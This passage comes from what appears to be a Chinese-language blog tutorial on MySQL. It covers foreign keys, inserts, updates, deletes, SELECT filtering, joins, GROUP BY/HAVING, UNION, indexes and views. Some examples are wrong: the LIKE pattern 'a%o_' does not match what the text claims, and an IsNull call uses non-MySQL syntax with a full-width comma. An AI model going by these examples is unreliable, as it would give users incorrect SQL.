<strong>ADD&#x2F;DROP FOREIGN KEY</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">ALTER TABLE 从表名</span><br><span class="line">[ADD CONSTRAINT 外键名]</span><br><span class="line">FOREIGN KEY (从表列名)</span><br><span class="line">REFERENCES 主表名 (主表列名)</span><br><span class="line">[ON DELETE &#123;RESTRICT | CASCADE | SET NULL | NO ACTION | SET DEFAULT&#125;]</span><br><span class="line">[ON UPDATE &#123;RESTRICT | CASCADE | SET NULL | NO ACTION | SET DEFAULT&#125;];</span><br><span class="line"></span><br><span class="line">-- ADD CONSTRAINT 外键名 省略会自动添加一个外键名</span><br><span class="line"></span><br><span class="line">-- 将 从表 从表列名 设置为外键，与 主表 的 主表列名 进行关联</span><br><span class="line"></span><br><span class="line">ALTER TABLE 表名 DROP FOREIGN KEY 外键名;</span><br><span class="line"></span><br><span class="line">-- 外键字段会被标记为“MUL”（表示Multiple）</span><br></pre></td></tr></table></figure><p><strong>查看外键名</strong><br>1.如果是创建表的时候创建的可以通过查看 <code>show</code> 语句查看创建的命令即可</p><p>2.通过mysql自带的系统表查看外键</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SELECT *</span><br><span class="line">FROM INFORMATION_SCHEMA.KEY_COLUMN_USAGE</span><br><span class="line">WHERE REFERENCED_TABLE_NAME = &#x27;主表&#x27; AND REFERENCED_COLUMN_NAME = &#x27;id&#x27;;</span><br></pre></td></tr></table></figure><p><img src="https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/42f8f201a1a141cbaab0485d86ba371c~tplv-k3u1fbpfcp-jj-mark:0:0:0:0:q75.image#?w=1732&h=114&s=28139&e=png&b=0c0c0c" alt="image.png"></p><p>3.查看与表所有相关的，包含 <code>primary key</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM INFORMATION_SCHEMA.KEY_COLUMN_USAGE  WHERE constraint_schema = &#x27;数据库名&#x27;  AND table_name = &#x27;从表&#x27;;</span><br></pre></td></tr></table></figure><p><img src="https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/d703f0928c654917a548e46996270d22~tplv-k3u1fbpfcp-jj-mark:0:0:0:0:q75.image#?w=1720&h=110&s=17557&e=png&b=0c0c0c" alt="image.png"></p><p><strong>ON DELETE, ON UPDATE</strong>, 当修改表数据的时候触发规则 <a href="https://blog.csdn.net/weiguang102/article/details/126409406">参考</a></p><table><thead><tr><th>参数</th><th>意义</th></tr></thead><tbody><tr><td>RESTRICT</td><td>限制外表中的外键改动（默认值，也是最安全的设置）</td></tr><tr><td>CASCADE</td><td>跟随外键改动</td></tr><tr><td>SET NULL</td><td>设为null值</td></tr><tr><td>NO ACTION</td><td>无动作</td></tr><tr><td>SET DEFAULT</td><td>设为默认值</td></tr></tbody></table><h3 id="查-DESC-x2F-SHOW"><a href="#查-DESC-x2F-SHOW" class="headerlink" title="查 DESC &#x2F; SHOW"></a>查 DESC &#x2F; SHOW</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DESC 表名;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SHOW COLUMNS FROM 表名;</span><br></pre></td></tr></table></figure><h2 id="数据"><a href="#数据" class="headerlink" title="数据"></a>数据</h2><h3 id="增"><a href="#增" class="headerlink" title="增"></a>增</h3><h4 id="INSERT-INTO"><a href="#INSERT-INTO" class="headerlink" title="INSERT INTO"></a>INSERT INTO</h4><ul><li>如果出现重复就会报错</li></ul><p>插入数据 <strong>INSERT INTO</strong>， 如果数据是<strong>字符型</strong>，必须使用**单引号 ‘ 或者双引号 “**，如： ‘value1’, “value1”。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO table_name (column1, column2, column3, ...)</span><br><span class="line">VALUES (value1, value2, value3, ...);</span><br><span class="line"></span><br><span class="line">-- table_name 是你要插入数据的表的名称。</span><br><span class="line">-- column1, column2, column3, ... 是表中的列名。</span><br><span class="line">-- value1, value2, value3, ... 是要插入的具体数值。</span><br></pre></td></tr></table></figure><p>如果你要<strong>插入所有列</strong>的数据，可以<strong>省略列名</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO users</span><br><span class="line">VALUES (NULL,&#x27;test&#x27;, &#x27;test@runoob.com&#x27;, &#x27;1990-01-01&#x27;, true);</span><br></pre></td></tr></table></figure><p>这里，<strong>NULL</strong> 是用于自增长列的占位符，表示系统将为 <strong>id</strong> 列生成一个唯一的值。</p><p>如果你要插入多行数据，可以在 VALUES 子句中指定多组数值：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO users (username, email, birthdate, is_active)</span><br><span class="line">VALUES</span><br><span class="line">    (&#x27;test1&#x27;, &#x27;test1@runoob.com&#x27;, &#x27;1985-07-10&#x27;, true),</span><br><span class="line">    (&#x27;test2&#x27;, &#x27;test2@runoob.com&#x27;, &#x27;1988-11-25&#x27;, false),</span><br><span class="line">    (&#x27;test3&#x27;, &#x27;test3@runoob.com&#x27;, &#x27;1993-05-03&#x27;, true);</span><br></pre></td></tr></table></figure><h4 id="INSERT-IGNORE-INTO"><a href="#INSERT-IGNORE-INTO" class="headerlink" title="INSERT IGNORE INTO"></a>INSERT IGNORE INTO</h4><ul><li><strong>有重复的就忽略该条数据的插入</strong></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 表中有些字段有默认值，则可以直接根据字段插入数据</span><br><span class="line">INSERT IGNORE INTO 表名（字段名1,字段名2,...) VALUES (值 1,值 2,...);</span><br><span class="line"></span><br><span class="line"># 按照表中所有字段进行插入数据，一定要与字段在表中定义的顺序一致</span><br><span class="line">INSERT IGNORE INTO 表名 VALUES (值 1,值 2,...);</span><br></pre></td></tr></table></figure><h4 id="REPLACE-INTO"><a href="#REPLACE-INTO" class="headerlink" title="REPLACE INTO"></a>REPLACE INTO</h4><ul><li>表示插入并替换数据，若表中有primary key或者unique索引，在插入数据的时候，若遇到重复的数据，则用新数据替换，如果没有数据效果则和insert into一样</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 表中有些字段有默认值，则可以直接根据字段插入数据</span><br><span class="line">REPLACE INTO 表名（字段名1,字段名2,...) VALUES (值 1,值 2,...);</span><br><span class="line"></span><br><span class="line"># 按照表中所有字段进行插入数据，一定要与字段在表中定义的顺序一致</span><br><span class="line">REPLACE INTO 表名 VALUES (值 1,值 2,...);</span><br></pre></td></tr></table></figure><h3 id="删-DELETE-FROM"><a href="#删-DELETE-FROM" class="headerlink" title="删 DELETE FROM"></a>删 DELETE FROM</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">DELETE FROM 表名</span><br><span class="line">WHERE 条件表达式;</span><br><span class="line">-- 没有指定 WHERE 子句，表中的所有记录将被删除。相当于清空表</span><br></pre></td></tr></table></figure><h3 id="改-UPDATE"><a href="#改-UPDATE" class="headerlink" title="改 UPDATE"></a>改 UPDATE</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">UPDATE 表名</span><br><span class="line">SET 列名 = 值, column2 = value2, ...</span><br><span class="line">WHERE 条件表达式;</span><br></pre></td></tr></table></figure><h3 id="查-SELECT-…-FROM"><a href="#查-SELECT-…-FROM" class="headerlink" title="查 SELECT … FROM"></a>查 SELECT … FROM</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SELECT 列名, column2, ...</span><br><span class="line">FROM 表名</span><br><span class="line">[WHERE 条件表达式]</span><br><span class="line">[ORDER BY 列名 [ASC | DESC]]</span><br><span class="line">[LIMIT 行数];</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT COUNT(*) FROM 表名;</span><br></pre></td></tr></table></figure><p><strong>WHERE</strong> </p><p>条件运算符（如 <code>=</code>, <code>&lt;</code>, <code>&gt;</code>, <code>&lt;=</code>, <code>&gt;=</code>, <code>!=</code>），逻辑运算符（如 <code>AND</code>, <code>OR</code>, <code>NOT</code>），以及通配符（如 <code>%</code>）, 正则 (<code>REGEXP</code>)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">-- 使用 AND 运算符和通配符</span><br><span class="line">SELECT * FROM users WHERE username LIKE &#x27;j%&#x27; AND is_active = TRUE;</span><br><span class="line"></span><br><span class="line">-- 使用 OR 运算符</span><br><span class="line">SELECT * FROM users WHERE is_active = TRUE OR birthdate &lt; &#x27;1990-01-01&#x27;;</span><br><span class="line"></span><br><span class="line">-- 使用 IN 子句</span><br><span class="line">SELECT * FROM users WHERE birthdate IN (&#x27;1990-01-01&#x27;, &#x27;1992-03-15&#x27;, &#x27;1993-05-03&#x27;);</span><br></pre></td></tr></table></figure><table><thead><tr><th align="left">操作符</th><th align="left">描述</th><th align="left">实例</th></tr></thead><tbody><tr><td align="left">&#x3D;</td><td align="left">等号，检测两个值是否相等，如果相等返回true</td><td align="left">(A &#x3D; B) 返回false。</td></tr><tr><td align="left">&lt;&gt;, !&#x3D;</td><td align="left">不等于，检测两个值是否相等，如果不相等返回true</td><td align="left">(A !&#x3D; B) 返回 true。</td></tr><tr><td align="left">&gt;</td><td align="left">大于号，检测左边的值是否大于右边的值, 如果左边的值大于右边的值返回true</td><td align="left">(A &gt; B) 返回false。</td></tr><tr><td align="left">&lt;</td><td align="left">小于号，检测左边的值是否小于右边的值, 如果左边的值小于右边的值返回true</td><td align="left">(A &lt; B) 返回 true。</td></tr><tr><td align="left">&gt;&#x3D;</td><td align="left">大于等于号，检测左边的值是否大于或等于右边的值, 如果左边的值大于或等于右边的值返回true</td><td align="left">(A &gt;&#x3D; B) 返回false。</td></tr><tr><td align="left">&lt;&#x3D;</td><td align="left">小于等于号，检测左边的值是否小于或等于右边的值, 如果左边的值小于或等于右边的值返回true</td><td align="left">(A &lt;&#x3D; B)</td></tr></tbody></table><p><strong>LIKE  、NOT LIKE</strong> 和 通配符</p><table><thead><tr><th>通配符</th><th>说明</th><th>实例</th></tr></thead><tbody><tr><td><strong>%</strong></td><td>搜索模式中给定位置的0个、1个或多个字符，<strong>不区分大小写</strong></td><td><strong>‘a%’</strong> 匹配以字母 <strong>‘a’</strong> 开头的任何字符串</td></tr><tr><td><strong>_</strong></td><td>总是匹配一个字符，不能多也不能少，<strong>常用来限制表达式的字符长度</strong></td><td><strong>‘_r%’</strong> 匹配第二个字母为 <strong>‘r’</strong> 的任何字符串</td></tr></tbody></table><p>组合使用 **% 和 _**， 选择用户名以 <strong>‘a’</strong> 开头、以 <strong>‘o’</strong> 结尾，并且长度为三个字符的所有用户</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE username LIKE &#x27;a%o_&#x27;;</span><br></pre></td></tr></table></figure><p><strong>BINARY 关键字 <strong>, 设定 WHERE 子句的字符串比较</strong>区分大小写</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT * from runoob_tbl WHERE BINARY runoob_author=&#x27;runoob.com&#x27;;</span><br><span class="line">Empty set (0.01 sec)</span><br><span class="line"> </span><br><span class="line">mysql&gt; SELECT * from runoob_tbl WHERE BINARY runoob_author=&#x27;RUNOOB.COM&#x27;;</span><br><span class="line">+-----------+---------------+---------------+-----------------+</span><br><span class="line">| runoob_id | runoob_title  | runoob_author | submission_date |</span><br><span class="line">+-----------+---------------+---------------+-----------------+</span><br><span class="line">| 3         | JAVA 教程   | RUNOOB.COM    | 2016-05-06      |</span><br><span class="line">| 4         | 学习 Python | RUNOOB.COM    | 2016-03-06      |</span><br><span class="line">+-----------+---------------+---------------+-----------------+</span><br><span class="line">2 rows in set (0.01 sec)</span><br></pre></td></tr></table></figure><p><strong>DISTINCT 关键字</strong>，<strong>去重</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT DISTINCT * FROM 表名;</span><br></pre></td></tr></table></figure><h4 id="条件查询-WHERE"><a href="#条件查询-WHERE" class="headerlink" title="条件查询 WHERE"></a>条件查询 WHERE</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM table_name WHERE condition; -- 根据特定条件过滤数据</span><br><span class="line">SELECT * FROM table_name WHERE column LIKE &#x27;value%&#x27;; -- 模糊匹配</span><br><span class="line">SELECT * FROM table_name WHERE column IN (value1, value2); -- 在指定值之间进行比较</span><br><span class="line">SELECT * FROM table_name WHERE column BETWEEN value1 AND value2; -- 在指定范围内进行比较</span><br><span class="line">SELECT * FROM table_name ORDER BY column ASC|DESC; -- 按指定列进行升序或降序排序</span><br></pre></td></tr></table></figure><h4 id="聚合查询-聚合函数"><a href="#聚合查询-聚合函数" class="headerlink" title="聚合查询 (聚合函数)"></a>聚合查询 (聚合函数)</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT COUNT(*) FROM table_name; -- 计算表中记录的数量</span><br><span class="line">SELECT SUM(column_name) FROM table_name; -- 对指定列进行求和操作</span><br><span class="line">SELECT AVG(column_name) FROM table_name; -- 对指定列进行平均值计算</span><br><span class="line">SELECT MAX(column_name), MIN(column_name) FROM table_name; -- 获得最大/小值</span><br><span class="line">SELECT GROUP_CONCAT(column_name SEPARATOR &#x27;, &#x27;) FROM table_name; -- 将多行数据合并为一行字符串</span><br><span class="line">SELECT SUM(column_name) AS &#x27;别名&#x27; FROM table_name; -- 别名设置</span><br></pre></td></tr></table></figure><p><img src="https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/ce82ebaac6494dca962013081f89abe3~tplv-k3u1fbpfcp-jj-mark:0:0:0:0:q75.image#?w=231&h=222&s=21906&e=png&b=0c0c0c" alt="image.png"></p><h4 id="分组查询-GROUP-BY"><a href="#分组查询-GROUP-BY" class="headerlink" title="分组查询 GROUP BY"></a>分组查询 GROUP BY</h4><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT 列名, AVG(IsNull(score，0)) FROM 表名 GROUP BY 分组字段;</span><br></pre></td></tr></table></figure><ul><li>一般结合聚合函数进行分组，否则单独分组没有意义</li><li>分组结果就是根据分组字段，将值相同的进行<strong>归类合并（类似于做报表统计）</strong></li></ul><p><img src="https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/e1721a1bbe654021b617052f37341674~tplv-k3u1fbpfcp-jj-mark:0:0:0:0:q75.image#?w=698&h=294&s=50744&e=png&b=ffffff" alt="image-20231206084817504.png"></p><h5 id="分组过滤条件-HAVING"><a href="#分组过滤条件-HAVING" class="headerlink" title="分组过滤条件 HAVING"></a>分组过滤条件 HAVING</h5><ul><li><p><code>having</code>子句用于<strong>分组</strong>后筛选，where子句用于<strong>行</strong>条件筛选</p></li><li><p><code>having</code>一般都是配合group by 和聚合函数一起出现如(<code>count(),sum(),avg(),max(),min()</code>)</p></li><li><p><code>where</code>条件子句中<strong>不能</strong>使用聚集函数，而<code>having</code>子句就可以。</p></li><li><p><code>having</code><strong>只能</strong>用在<code>group by</code>之后，where执行在group by之前</p></li></ul><p>实例</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT city ,count(*) as num from staff  where age&gt; 19 group by city HAVING num &gt;= 3;</span><br></pre></td></tr></table></figure><h4 id="连接查询-JOIN"><a href="#连接查询-JOIN" class="headerlink" title="连接查询 JOIN"></a>连接查询 JOIN</h4><ul><li><p>左表: 连接关键字的左边的表</p></li><li><p>右表: 连接关键字的右边的表</p></li></ul><p>1.<strong>INNER JOIN</strong></p><p>返回的结果以满足条件的数据, 即有多少条满足条件的，返回的结果就有多少行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SELECT *</span><br><span class="line"> FROM tbl_emp a</span><br><span class="line"> INNER JOIN tbl_dept b</span><br><span class="line"> ON a.deptID = b.ID;</span><br></pre></td></tr></table></figure><p>外包不满足条件，所以结果中没有外包</p><p><img src="https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/b4625fee40b64d1783bdb07906741750~tplv-k3u1fbpfcp-jj-mark:0:0:0:0:q75.image#?w=750&h=339&s=20313&e=png&b=fbfbfb" alt="image.png"></p><p>2.<strong>LEFT JOIN</strong></p><p>返回的结果<strong>以左表为准</strong>，即左表有多少行，返回的结果就有多少行，满足条件就有数据，不满足为null</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SELECT *</span><br><span class="line">FROM tbl_dept b</span><br><span class="line">LEFT JOIN tbl_emp a</span><br><span class="line">ON a.deptID = b.ID;</span><br></pre></td></tr></table></figure><p>此处将 dept 作为左表，所以结果以dept为准，不满足条件则为 null</p><p><img src="https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/8caa4a99c8f4468bb0773467e1e5a27a~tplv-k3u1fbpfcp-jj-mark:0:0:0:0:q75.image#?w=878&h=375&s=24892&e=png&b=fafafa" alt="image.png"></p><p>3.<strong>RIGHT JOIN</strong></p><p>返回的结果<strong>以右表为准</strong>，即右表有多少行，返回的结果就有多少行，满足条件就有数据，不满足为null</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SELECT *</span><br><span class="line"> FROM tbl_emp a</span><br><span class="line"> RIGHT JOIN tbl_dept b</span><br><span class="line"> ON a.deptID = b.ID</span><br></pre></td></tr></table></figure><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/2e10cc53c033490b916fa122ecf0c133~tplv-k3u1fbpfcp-jj-mark:0:0:0:0:q75.image#?w=744&h=380&s=23155&e=png&b=fbfbfb" alt="image.png"></p><h4 id="嵌套查询-子查询"><a href="#嵌套查询-子查询" class="headerlink" title="嵌套查询 (子查询)"></a>嵌套查询 (子查询)</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT column_name FROM table_name WHERE column_name IN (SELECT column_name FROM another_table); -- 通过子查询来限制主查询的结果</span><br><span class="line">SELECT column_name FROM table_name WHERE EXISTS (SELECT column_name FROM another_table WHERE condition); -- 判断子查询是否存在结果</span><br></pre></td></tr></table></figure><h4 id="联合查询-UNION"><a href="#联合查询-UNION" class="headerlink" title="联合查询 UNION"></a>联合查询 UNION</h4><ul><li>需要保证两个查询语句中的<strong>字段数量是一致的</strong></li><li>Union 和 Join 子句不同，因为 union 总是<strong>垂直</strong>组合结果集，而 join<strong>水平</strong>附加输出</li><li>最后结果的表头会以<strong>第一个查询语句的字段名</strong>为准，可以使用别名替换</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT column_name FROM table1 UNION SELECT column_name FROM table2; -- 合并两个查询结果集，自动去除重复行</span><br><span class="line">SELECT column_name FROM table1 UNION ALL SELECT column_name FROM table2; -- 合并两个查询结果集，保留重复行</span><br></pre></td></tr></table></figure><p><strong>UNION 和其他语句一同出现执行顺序</strong></p><p>from—&gt;on—&gt;join—&gt;where—&gt;group by—&gt;having+(聚合函数)—&gt;select—&gt;distinct—&gt;<strong>UNION—&gt;order by—&gt;limit</strong></p><p><strong>举例：</strong></p><p>1.<strong>UNION 和 WHERE 语句</strong> ，UNION 在 where 之后，所以第二个表的WHERE先筛选后进行数据集拼接；</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-- 1、第二个子句中的 where 语句不能同时作用于两个select语句</span><br><span class="line">SELECT *, &#x27;table1&#x27; FROM test_user u </span><br><span class="line">UNION ALL</span><br><span class="line">SELECT *, &#x27;table2&#x27; FROM test_user u WHERE AGE = 30;</span><br></pre></td></tr></table></figure><p>2.<strong>UNION 和 GROUP 语句</strong>，UNION 在 GROUP BY 之后，所以 table2 的 GROUP BY 先分组后进行数据集拼接；</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-- 2、第二个子句中的 group by 语句不能同时作用于两个select语句</span><br><span class="line">-- 5 + 3，共计 8 条</span><br><span class="line">SELECT *, &#x27;table1&#x27; FROM test_user u </span><br><span class="line">UNION ALL</span><br><span class="line">SELECT *, &#x27;table2&#x27; FROM test_user u GROUP BY AGE;</span><br></pre></td></tr></table></figure><h2 id="索引-index"><a href="#索引-index" class="headerlink" title="索引 index"></a>索引 index</h2><ul><li>单列索引，即一个索引只包含单个列，一个表可以有多个单列索引。</li><li>组合索引，即一个索引包含多个列。</li></ul><p>创建索引时，你需要确保该索引是应用在 SQL 查询语句的条件(一般作为 WHERE 子句的条件)。</p><p>实际上，索引也是一张表，该表保存了主键与索引字段，并指向实体表的记录。</p><p>有 普通索引 <strong>INDEX</strong>，唯一索引 <strong>UNIQUE</strong>，全文索引<strong>FULLTEXT</strong></p><h3 id="增-CREATE-INDEX"><a href="#增-CREATE-INDEX" class="headerlink" title="增 CREATE INDEX"></a>增 CREATE INDEX</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CREATE INDEX 索引名 ON 表名 (列名 [ASC|DESC], column2 [ASC|DESC], ...);</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ALTER TABLE 表名</span><br><span class="line">ADD INDEX 索引名(列名 [ASC|DESC], column2 [ASC|DESC], ...);</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE 表名 (</span><br><span class="line">  ...,</span><br><span class="line">  INDEX 索引名(列名 [ASC|DESC], column2 [ASC|DESC], ...)</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>唯一索引</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CREATE UNIQUE INDEX 索引名</span><br><span class="line">ON 表名 (列名 [ASC|DESC], column2 [ASC|DESC], ...);</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ALTER TABLE 表名 ADD UNIQUE [索引名] (columnName(length))</span><br></pre></td></tr></table></figure><h3 id="删-DROP-INDEX"><a href="#删-DROP-INDEX" class="headerlink" title="删 DROP INDEX"></a>删 DROP INDEX</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DROP INDEX 索引名 ON 表名;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ALTER TABLE 表名 DROP INDEX 索引名;</span><br></pre></td></tr></table></figure><h3 id="改"><a href="#改" class="headerlink" title="改"></a>改</h3><p>先删再建</p><h3 id="查-SHOW-INDEX"><a href="#查-SHOW-INDEX" class="headerlink" title="查 SHOW INDEX"></a>查 SHOW INDEX</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SHOW INDEX FROM 表名 \G;</span><br><span class="line">-- \G 格式化</span><br></pre></td></tr></table></figure><h2 id="视图-view"><a href="#视图-view" class="headerlink" title="视图 view"></a>视图 view</h2><ul><li>视图是一种 虚拟表 ，本身是 不具有数据 的，占用很少的内存空间。</li><li><strong>视图建立在已有表的基础上</strong>, 视图赖以建立的这些表称为<strong>基表</strong>。</li><li>可以帮助我们把经常查询的结果集放到虚拟表中，提升使用效率</li><li>因为视图是一个虚拟存在的表，不保存数据，<strong>当对视图数据进行操作时，就相当于对基本表数据进行操作</strong>。</li></ul><h3 id="增-CREATE-VIEW"><a href="#增-CREATE-VIEW" class="headerlink" title="增 CREATE VIEW"></a>增 CREATE VIEW</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CREATE VIEW 视图名称 AS 查询语句</span><br></pre></td></tr></table></figure><ul><li><p>实际上就是我们在 SQL 查询语句的基础上封装了视图 VIEW，这样就会基于 SQL 语句的结果集形成一张虚拟表。</p></li><li><p>在创建视图时，没有在视图名后面指定字段列表，则视图中字段列表默认和SELECT语句中的字段列表一致。如果SELECT语句中给字段取了别名，那么视图中的字段名和别名相同。</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CREATE [OR REPLACE] </span><br><span class="line">[ALGORITHM = &#123;UNDEFINED | MERGE | TEMPTABLE&#125;] </span><br><span class="line">VIEW 视图名称 [(字段列表)] </span><br><span class="line">AS 查询语句 </span><br><span class="line">[WITH [CASCADED|LOCAL] CHECK OPTION]</span><br></pre></td></tr></table></figure><h3 id="删-DROP-VIEW"><a href="#删-DROP-VIEW" class="headerlink" title="删 DROP VIEW"></a>删 DROP VIEW</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">DROP VIEW IF EXISTS 视图名称;</span><br><span class="line">DROP VIEW IF EXISTS 视图名称1,视图名称2,视图名称3,...;</span><br></pre></td></tr></table></figure><h3 id="改-ALTER-VIEW"><a href="#改-ALTER-VIEW" class="headerlink" title="改 ALTER VIEW"></a>改 ALTER VIEW</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ALTER VIEW 视图名称 </span><br><span class="line">AS查询语句</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">CREATE OR REPLACE VIEW empvu80 </span><br><span class="line">(id_number, name, sal, department_id) </span><br><span class="line">AS</span><br><span class="line">SELECT employee_id, first_name || &#x27; &#x27; || last_name, salary, department_id </span><br><span class="line">FROM employees</span><br><span class="line">WHERE department_id = 80;</span><br></pre></td></tr></table></figure><h3 id="查-SHOW-x2F-SELECT-x2F-DESC"><a href="#查-SHOW-x2F-SELECT-x2F-DESC" class="headerlink" title="查 